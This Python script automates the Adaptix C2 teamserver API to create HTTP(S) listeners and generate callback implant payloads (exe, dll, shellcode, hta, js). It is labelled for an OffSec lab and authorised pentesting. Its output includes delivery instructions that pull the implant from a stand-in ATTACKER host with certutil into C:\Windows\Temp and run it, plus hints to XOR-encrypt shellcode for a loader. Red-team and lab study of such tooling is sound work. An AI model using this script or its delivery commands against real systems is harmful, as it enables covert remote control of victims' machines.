#!/usr/bin/env python3
"""
adaptix_gen.py — Adaptix C2 listener + agent automation.

Creates an HTTP(S) external listener and generates an agent payload
via the Adaptix teamserver REST API. The generated agent connects back
to the Adaptix listener (not to netcat) using the Adaptix wire protocol.

Usage:
  python3 adaptix_gen.py --help
  python3 adaptix_gen.py --ts https://TEAMSERVER:4321/endpoint
  python3 adaptix_gen.py --ts https://10.10.14.5:4321/endpoint \
      --lhost 10.10.14.5 --lport 443 --format exe --arch x64
  python3 adaptix_gen.py --ts https://10.10.14.5:4321/endpoint \
      --listener-only
  python3 adaptix_gen.py --ts https://10.10.14.5:4321/endpoint \
      --generate-only --listener-name my_https_443

OffSec OSAI lab / authorized pentesting use only.
"""

import argparse
import json
import os
import sys
import urllib.request
import urllib.error
import ssl
import getpass
from pathlib import Path


def make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def api_request(endpoint, path, token=None, data=None, raw_response=False):
    url = f"{endpoint.rstrip('/')}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers)

    try:
        resp = urllib.request.urlopen(req, context=make_ssl_ctx())
    except urllib.error.HTTPError as exc:
        err_body = exc.read().decode(errors="replace")
        print(f"[!] HTTP {exc.code} on {path}: {err_body}", file=sys.stderr)
        sys.exit(1)
    except urllib.error.URLError as exc:
        print(f"[!] Connection failed: {exc.reason}", file=sys.stderr)
        sys.exit(1)

    if raw_response:
        return resp.read()

    return json.loads(resp.read().decode())


# ── Authentication ────────────────────────────────────────────────────────────

def login(endpoint, username, password):
    print(f"[*] Authenticating as '{username}' ...")
    resp = api_request(endpoint, "/login", data={
        "username": username,
        "password": password,
    })
    token = resp.get("access_token")
    if not token:
        print(f"[!] Login failed: {resp}", file=sys.stderr)
        sys.exit(1)
    version = resp.get("version", "unknown")
    print(f"[+] Authenticated. Server version: {version}")
    return token


# ── Listener Management ──────────────────────────────────────────────────────

def list_listeners(endpoint, token):
    resp = api_request(endpoint, "/listener/list", token=token)
    listeners = resp if isinstance(resp, list) else resp.get("listeners", [])
    return listeners


def create_listener(endpoint, token, name, listener_type, config):
    print(f"[*] Creating listener '{name}' (type: {listener_type}) ...")
    config_str = json.dumps(config) if isinstance(config, dict) else config
    resp = api_request(endpoint, "/listener/create", token=token, data={
        "name": name,
        "type": listener_type,
        "config": config_str,
    })
    ok = resp.get("ok", False)
    msg = resp.get("message", "")
    if ok:
        print(f"[+] Listener '{name}' created successfully.")
    else:
        print(f"[!] Listener creation: {msg}", file=sys.stderr)
        if "already" in msg.lower():
            print(f"[*] Listener '{name}' may already exist, continuing ...")
        else:
            sys.exit(1)
    return resp


def build_listener_config(args):
    config = {
        "callback_hosts": args.lhost,
        "port":           str(args.lport),
        "bind_host":      args.bind_host,
        "bind_port":      str(args.lport),
        "uri":            args.uri,
        "user_agent":     args.user_agent,
        "ssl":            args.ssl,
    }
    if args.headers:
        config["headers"] = args.headers
    return config


# ── Agent Generation ──────────────────────────────────────────────────────────

def generate_agent(endpoint, token, listener_name, listener_type, agent_type, config):
    print(f"[*] Generating agent (listener: {listener_name}, type: {agent_type}) ...")
    config_str = json.dumps(config) if isinstance(config, dict) else config
    payload = api_request(endpoint, "/agent/generate", token=token, data={
        "listener_name": listener_name,
        "listener_type": listener_type,
        "agent":         agent_type,
        "config":        config_str,
    }, raw_response=True)

    if not payload or len(payload) < 100:
        text = payload.decode(errors="replace") if payload else "(empty)"
        print(f"[!] Agent generation returned unexpected data: {text}", file=sys.stderr)
        sys.exit(1)

    return payload


def build_agent_config(args):
    config = {
        "arch":     args.arch,
        "format":   args.format,
        "sleep":    str(args.sleep),
        "jitter":   str(args.jitter),
    }
    if args.killdate:
        config["killdate"] = args.killdate
    return config


# ── Output ────────────────────────────────────────────────────────────────────

FORMAT_EXTENSIONS = {
    "exe":       ".exe",
    "dll":       ".dll",
    "shellcode": ".bin",
    "svc_exe":   ".exe",
    "hta":       ".hta",
    "js":        ".js",
}


def save_payload(payload, outdir, name, fmt):
    os.makedirs(outdir, exist_ok=True)
    ext = FORMAT_EXTENSIONS.get(fmt, ".bin")
    outpath = os.path.join(outdir, f"{name}{ext}")
    with open(outpath, "wb") as fh:
        fh.write(payload)
    print(f"[+] Payload saved: {outpath}  ({len(payload)} bytes)")
    return outpath


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="adaptix_gen.py",
        description="Adaptix C2 — create listener + generate agent payload via REST API.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  # Full flow: create listener + generate agent
  python3 adaptix_gen.py \\
      --ts https://10.10.14.5:4321/endpoint \\
      --lhost 10.10.14.5 --lport 443 --ssl \\
      --format exe --arch x64

  # Listener only (generate agent later via GUI)
  python3 adaptix_gen.py \\
      --ts https://10.10.14.5:4321/endpoint \\
      --lhost 10.10.14.5 --lport 443 --ssl \\
      --listener-only

  # Agent only (reuse existing listener)
  python3 adaptix_gen.py \\
      --ts https://10.10.14.5:4321/endpoint \\
      --generate-only --listener-name my_listener \\
      --format shellcode --arch x64

  # Linux agent via GopherTCP
  python3 adaptix_gen.py \\
      --ts https://10.10.14.5:4321/endpoint \\
      --lhost 10.10.14.5 --lport 443 \\
      --agent-type gopher_tcp --format exe --arch x64
""",
    )

    # ── Connection ──
    conn = p.add_argument_group("Teamserver connection")
    conn.add_argument(
        "--ts", "--teamserver", required=True, dest="teamserver",
        help="Teamserver URL (e.g. https://10.10.14.5:4321/endpoint).",
    )
    conn.add_argument("--user", default="operator", help="Username (default: operator).")
    conn.add_argument("--password", default=None, help="Password (prompted if omitted).")

    # ── Listener ──
    lst = p.add_argument_group("Listener config")
    lst.add_argument("--lhost", default=None, help="Callback host / external IP.")
    lst.add_argument("--lport", type=int, default=443, help="Listener port (default: 443).")
    lst.add_argument("--bind-host", default="0.0.0.0", help="Bind address (default: 0.0.0.0).")
    lst.add_argument(
        "--listener-type", default="beacon_http",
        help="Listener extender type (default: beacon_http).",
    )
    lst.add_argument("--listener-name", default=None, help="Listener name (auto-generated if omitted).")
    lst.add_argument("--uri", default="/api/v1/check", help="Callback URI path (default: /api/v1/check).")
    lst.add_argument(
        "--user-agent",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        help="HTTP User-Agent header.",
    )
    lst.add_argument("--ssl", action="store_true", default=True, help="Enable HTTPS (default: on).")
    lst.add_argument("--no-ssl", dest="ssl", action="store_false", help="Disable HTTPS (plain HTTP).")
    lst.add_argument("--headers", default=None, help="Extra HTTP headers (JSON string).")

    # ── Agent ──
    agt = p.add_argument_group("Agent config")
    agt.add_argument(
        "--agent-type", default="beacon_http",
        help="Agent extender type (default: beacon_http). Use gopher_tcp for Linux.",
    )
    agt.add_argument("--arch", default="x64", choices=["x64", "x86"], help="Architecture (default: x64).")
    agt.add_argument(
        "--format", default="exe",
        choices=["exe", "dll", "shellcode", "svc_exe", "hta", "js"],
        help="Output format (default: exe).",
    )
    agt.add_argument("--sleep", type=int, default=5, help="Beacon sleep in seconds (default: 5).")
    agt.add_argument("--jitter", type=int, default=20, help="Jitter percentage (default: 20).")
    agt.add_argument("--killdate", default=None, help="Kill date (YYYY-MM-DD).")

    # ── Output ──
    out = p.add_argument_group("Output")
    out.add_argument("--outdir", default="./adaptix_payloads", help="Output directory.")
    out.add_argument("--outname", default="agent", help="Output filename (without extension).")

    # ── Mode ──
    mode = p.add_argument_group("Mode")
    mode.add_argument(
        "--listener-only", action="store_true",
        help="Only create listener, do not generate agent.",
    )
    mode.add_argument(
        "--generate-only", action="store_true",
        help="Only generate agent (listener must already exist).",
    )
    mode.add_argument(
        "--list-listeners", action="store_true",
        help="List existing listeners and exit.",
    )

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    endpoint = args.teamserver.rstrip("/")

    password = args.password
    if not password:
        password = os.environ.get("ADAPTIX_PASSWORD")
    if not password:
        password = getpass.getpass(f"[?] Password for '{args.user}': ")

    # ── Auth ──
    token = login(endpoint, args.user, password)

    # ── List mode ──
    if args.list_listeners:
        listeners = list_listeners(endpoint, token)
        if not listeners:
            print("[*] No listeners found.")
        else:
            print(f"\n[*] {len(listeners)} listener(s):\n")
            for lst in listeners:
                if isinstance(lst, dict):
                    print(f"    - {lst.get('name', '?')}  "
                          f"type={lst.get('type', '?')}  "
                          f"status={lst.get('status', '?')}")
                else:
                    print(f"    - {lst}")
        return

    # ── Determine listener name ──
    listener_name = args.listener_name
    if not listener_name:
        proto = "https" if args.ssl else "http"
        listener_name = f"{proto}_{args.lport}"

    # ── Create listener ──
    if not args.generate_only:
        if not args.lhost:
            print("[!] --lhost is required to create a listener.", file=sys.stderr)
            sys.exit(1)

        listener_config = build_listener_config(args)
        create_listener(endpoint, token, listener_name, args.listener_type, listener_config)

        if args.listener_only:
            print(f"\n[+] Done. Listener '{listener_name}' is active on port {args.lport}.")
            print(f"    Generate agent via GUI or re-run with --generate-only --listener-name {listener_name}")
            return

    # ── Generate agent ──
    agent_config = build_agent_config(args)
    payload = generate_agent(
        endpoint, token,
        listener_name, args.listener_type, args.agent_type,
        agent_config,
    )
    outpath = save_payload(payload, args.outdir, args.outname, args.format)

    # ── Summary ──
    print(f"\n{'─' * 72}")
    print(f"  Teamserver : {endpoint}")
    print(f"  Listener   : {listener_name}  (port {args.lport})")
    print(f"  Agent type : {args.agent_type}")
    print(f"  Format     : {args.format} / {args.arch}")
    print(f"  Sleep      : {args.sleep}s  (jitter {args.jitter}%)")
    print(f"  Payload    : {outpath}  ({os.path.getsize(outpath)} bytes)")
    print(f"{'─' * 72}")

    if args.format == "shellcode":
        print(f"\n  Load with:  python3 loader.py {outpath}")
        print(f"  Or encrypt: python3 xor_encrypt_bin.py {outpath} --key 0xDEADBEEF")
        print(f"              python3 loader.py {outpath}.enc --key 0xDEADBEEF")

    if args.format == "exe":
        print(f"\n  Deliver & execute on target:")
        print(f"    certutil -urlcache -f http://ATTACKER/{os.path.basename(outpath)} C:\\Windows\\Temp\\svc.exe")
        print(f"    C:\\Windows\\Temp\\svc.exe")

    print()


if __name__ == "__main__":
    main()
